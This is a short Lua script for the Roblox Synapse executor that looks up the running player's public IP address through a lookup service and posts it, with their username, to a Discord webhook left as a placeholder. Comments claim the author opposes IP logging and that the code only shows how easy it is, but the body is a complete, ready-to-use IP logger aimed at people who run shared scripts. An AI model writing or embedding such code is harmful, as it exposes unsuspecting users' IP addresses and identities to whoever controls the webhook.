local Made_By_ihaxgameszs = tostring ( game:HttpGet ( "https://api.ipify.org", true ) )

syn.request({
   Url = "DISCORD WEBHOOK HERE",
   Method = "POST",
   Headers = {
       ["Content-Type"] = "application/json"
   },
   Body = game:GetService("HttpService"):JSONEncode({
       ["content"] = "|Player Name| ="..game.players.localplayer.name.." |Player Ip| ="..Made_By_ihaxgameszs..""
   })
})

-- useing a better api people can log more then your ip

-- this is why i always use a http spy when executing scripts... you never know what the devs are hiding thats why some people go all out with security

-- i dont support ip logging this is just to show how easy it is to ip log someone if thay use your script 
